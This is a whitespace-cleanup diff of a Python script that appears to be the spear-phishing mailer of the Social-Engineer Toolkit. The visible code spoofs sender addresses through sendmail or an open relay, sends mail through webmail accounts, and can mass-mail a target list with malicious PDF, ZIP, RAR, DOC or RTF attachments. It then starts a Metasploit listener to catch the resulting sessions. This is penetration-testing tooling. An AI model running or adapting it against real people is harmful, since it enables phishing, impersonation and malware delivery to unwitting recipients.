@@ -29,7 +29,7 @@ for line in sendmail_file:
     # strip carriage returns
     line=line.rstrip()
     match=re.search("SENDMAIL=",line)
-    if match: 
+    if match:
         # if match and if line is flipped on continue on
         if line == ("SENDMAIL=ON"):
             print_info("Sendmail is a Linux based SMTP Server, this can be used to spoof email addresses.")
@@ -47,8 +47,8 @@ for line in sendmail_file:
                     sys.exit()
                 smtp = ("localhost")
                 port = ("25")
-                # Flip sendmail switch to get rid of some questions             
-                sendmail=1 
+                # Flip sendmail switch to get rid of some questions
+                sendmail=1
                 # just throw user and password to blank, needed for defining below
                 user=''
                 pwd=''
@@ -78,13 +78,13 @@ for line in sendmail_file:
                 smtp = ("smtp.hotmail.com")
                 port = ("25")
 
-# DEFINE METASPLOIT PATH 
+# DEFINE METASPLOIT PATH
 meta_path=meta_path()
 
-print_info("As an added bonus, use the file-format creator in SET to create your attachment.") 
+print_info("As an added bonus, use the file-format creator in SET to create your attachment.")
 counter=0
 # PDF Previous
-if os.path.isfile("src/program_junk/template.pdf"): 
+if os.path.isfile("src/program_junk/template.pdf"):
     if os.path.isfile("src/program_junk/template.rar"):
         if os.path.isfile("src/program_junk/template.zip"):
             print_warning("Multiple payloads were detected:")
@@ -96,7 +96,7 @@ if os.path.isfile("src/program_junk/template.pdf"):
             counter=1
 if counter==0:
     if os.path.isfile("src/program_junk/template.pdf"): file_format=("src/program_junk/template.pdf")
-    if os.path.isfile("src/program_junk/template.rar"): file_format=("src/program_junk/template.rar") 
+    if os.path.isfile("src/program_junk/template.rar"): file_format=("src/program_junk/template.rar")
     if os.path.isfile("src/program_junk/template.zip"): file_format=("src/program_junk/template.zip")
     if os.path.isfile("src/program_junk/template.doc"): file_format=("src/program_junk/template.doc")
     if os.path.isfile("src/program_junk/template.rtf"): file_format=("src/program_junk/template.rtf")
@@ -156,7 +156,7 @@ if option1 == '1' or option1 == '2':
 
     print ("""
    Do you want to use a predefined template or craft
-   a one time email template. 
+   a one time email template.
 
    1. Pre-Defined Template
    2. One-Time Use Email Template
@@ -165,7 +165,7 @@ if option1 == '1' or option1 == '2':
     # if predefined template go here
     if template_choice == '1':
         # set path for
-        path = 'src/templates/' 
+        path = 'src/templates/'
         filewrite=file("src/program_junk/email.templates", "w")
         counter=0
         # Pull all files in the templates directory
@@ -241,12 +241,12 @@ if option1 == '1' or option1 == '2':
 
 # single email
 if option1 == '1':
-   to = raw_input(setprompt(["1"], "Send email to"))
+    to = raw_input(setprompt(["1"], "Send email to"))
 
 # mass emailer
 if option1 == '2':
     print ("""
- The mass emailer will allow you to send emails to multiple 
+ The mass emailer will allow you to send emails to multiple
  individuals in a list. The format is simple, it will email
  based off of a line. So it should look like the following:
 
@@ -257,16 +257,16 @@ if option1 == '2':
  This will continue through until it reaches the end of the
  file. You will need to specify where the file is, for example
  if its in the SET folder, just specify filename.txt (or whatever
- it is). If its somewhere on the filesystem, enter the full path, 
+ it is). If its somewhere on the filesystem, enter the full path,
  for example /home/relik/ihazemails.txt
 """)
     filepath = raw_input(setprompt(["1"], "Path to the file to import into SET"))
 
 # exit mass mailer menu
-if option1 == '99': 
+if option1 == '99':
     exit_set()
 
-print ("""\n  1. Use a %s Account for your email attack.\n  2. Use your own server or open relay\n""" % (email_provider)) 
+print ("""\n  1. Use a %s Account for your email attack.\n  2. Use your own server or open relay\n""" % (email_provider))
 relay = raw_input(setprompt(["1"], ""))
 counter=0
 # Specify SMTP Option Here
@@ -293,11 +293,11 @@ if relay == '2':
 # specify if its a high priority or not
 highpri = yesno_prompt(["1"], "Flag this message/s as high priority? [yes|no]")
 if not "YES" in highpri:
-        prioflag1 = ""
-        prioflag2 = ""
+    prioflag1 = ""
+    prioflag2 = ""
 else:
-        prioflag1 = ' 1 (Highest)'
-        prioflag2 = ' High'
+    prioflag1 = ' 1 (Highest)'
+    prioflag2 = ' High'
 
 # Define mail send here
 def mail(to, subject, text, attach, prioflag1, prioflag2):
@@ -358,27 +358,27 @@ def mail(to, subject, text, attach, prioflag1, prioflag2):
                     return_continue()
 
     if email_provider == "yahoo" or email_provider == "hotmail":
-        mailServer.login(user, pwd)        
+        mailServer.login(user, pwd)
         thread.start_new_thread(mailServer.sendmail,(user1, to, msg.as_string()))
 
-    if sendmail == 1: 
-        thread.start_new_thread(mailServer.sendmail,(user1, to, msg.as_string()))    
+    if sendmail == 1:
+        thread.start_new_thread(mailServer.sendmail,(user1, to, msg.as_string()))
 
 if option1 == '1':
     mail("%s" % (to), subject, body, "%s" % (file_format), prioflag1, prioflag2)
 
 if option1 == '2':
-      counter=0
-      email_num=0
-      fileopen=file(filepath, "r").readlines()
-      for line in fileopen:
-          to = line.rstrip()
-          mail("%s" % (to),
-          subject,
-          body,
-          "%s" % (file_format), prioflag1, prioflag2)
-          email_num=email_num+1
-          print "   Sent e-mail number: " + (str(email_num))
+    counter=0
+    email_num=0
+    fileopen=file(filepath, "r").readlines()
+    for line in fileopen:
+        to = line.rstrip()
+        mail("%s" % (to),
+        subject,
+        body,
+        "%s" % (file_format), prioflag1, prioflag2)
+        email_num=email_num+1
+        print "   Sent e-mail number: " + (str(email_num))
 
 if not os.path.isfile("src/program_junk/template.zip"):
     print_status("SET has finished delivering the emails")
@@ -392,7 +392,7 @@ if not os.path.isfile("src/program_junk/template.zip"):
             child=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/unc_config" % (meta_path))
             try: child.interact()
             except Exception: child.close()
-        
+
         if os.path.isfile("src/program_junk/payload.options"):
             fileopen=file("src/program_junk/payload.options","r").readlines()
             for line in fileopen:
